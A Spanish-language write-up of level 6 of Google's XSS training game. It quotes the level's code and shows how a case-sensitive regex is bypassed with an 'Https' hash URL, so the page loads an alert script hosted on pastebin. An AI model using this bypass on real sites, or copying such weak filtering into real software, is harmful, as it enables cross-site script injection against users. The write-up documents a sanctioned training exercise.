#[6/6]  Level 6: Follow the 🐇

#Mission Description

Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash. 

This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.

#Mission Objective

Find a way to make the application request an external file which will cause it to execute an alert(). 

# Write Up Iker 

Primero que nada vamos a mirar el código fuente de la página para analizar correctamente la prueba.

Observando la foto del index.html y su contenido parece que sólamente nos deja cargar los scripts de la carpeta **/static/gadget.js** que luego ejecuta el contenido en el navegador.

```javascript
getGadgetName() 
{ 
  return window.location.hash.substr(1) || "/static/gadget.js";
}
```

Además tiene un código que evita que se pueda cargar scripts desde una URL con el siguiente código:

```javascript
// This will totally prevent us from loading evil URLs!
      if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }
````

Aquí podemos pensar en dos maneras para ejecutar el código:
  - 1 Intentar modificar el contenido de ```/static/gadget.js```
  - 2 Intentar hacer un **Bypass** de la comprobación de obtener y ejecutar el script mediante una URL 

Vaya, vaya, vaya...se pone algo complicado...

Tras muchas vueltas, hemos elegido la segunda opción por la siguiente razón: **REGEX** y **CASE SENSITIVE**
¿Porque? Porque el Regex de la consulta sólamente verifica que la URL sea **"https?"**, es decir, que si ponemos **"Https?** o ****"hTtps?** o **"hTTps?** etc nos dejaría hacer el Bypass ya que el resultado no coincidiría y podríamos cargar el script desde una URL.

Ahora tenemos que conseguir conlgar nuestro script en alguna URL y montar la URL de la consulta para que pueda ejecutarla.
La mejor página para hacer esto es **www.pastebin.com**. Te permite escribir un código HTML, JavaScript, etc, colgarlo online y ponerle fecha de expiración.

Creamos el script de alerta en pastebin.com y copiamos la URL con el mensaje **ZASCA!**:

```javascript alert('ZASCA!') ```

En este caso hemos creado la siguiente URL: ``` https://pastebin.com/raw/ny1kd5mC```

Y tenemos la siguiente URL completa para pasarsela al navegador:

``` https://xss-game.appspot.com/level6/frame#https://pastebin.com/raw/ny1kd5mC ```

**ERROR**!!! Recordar el **REGEX** que es **CASE SENSITIVE** y que debemos cambiar algún parámetro del https

Ahora quedaría de esta forma (modificamos la **H** del principio del **https** a **MAYUSCULAS** así **Https**:

``` https://xss-game.appspot.com/level6/frame#Https://pastebin.com/raw/ny1kd5mC ```

Nos muestra un cuadro de texto indicando que hemos pasado de nivel y completado el Juego de XSS de Google :) 

:beers: :v: :sunglasses: :v: :beers:

Iker Burguera
